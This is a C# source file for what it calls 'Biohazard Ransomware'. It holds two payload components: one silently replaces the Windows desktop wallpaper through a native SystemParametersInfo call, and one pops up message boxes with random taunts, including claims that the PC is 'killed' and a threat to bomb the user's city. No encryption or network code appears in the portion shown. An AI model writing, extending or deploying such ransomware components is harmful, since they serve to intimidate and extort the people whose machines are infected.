using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Biohazard.SetWallpaper
{
    class BiohazardWallPaper
    {
        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        private static extern Int32 SystemParametersInfo(UInt32 uiAction, UInt32 uiParam, String pvParam, UInt32 fWinIni);
        private static UInt32 SPI_SETDESKWALLPAPER = 20;
        private static UInt32 SPIF_UPDATEINIFILE = 0x1;
        public void SetWallpaper(string wallpaper)
        {
            SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, wallpaper, SPIF_UPDATEINIFILE);
        }
    }
}
namespace Biohazard.MsgBoxPayload
{

    class MessageBpayload
    {
        public void MessagePayload()
        {
            string[] payload =
            {
                "don't even try to kill this ransomware",
                "Biohazard is Killed ur PC :D",
                "Biohazard Ransomware is King of All Viruses",
                "Biohazard Ransomware soon Killing ur PC",
                "Biohazard Ransomware soon BOMBING ur CITY :D",
            };
            Random rnd = new Random();
            uint psx = (uint)payload.Length;
            MessageBox.Show((string)payload[rnd.Next() % psx], "Biohazard Ransomware", MessageBoxButtons.OK, MessageBoxIcon.Information);
        }
    }
}
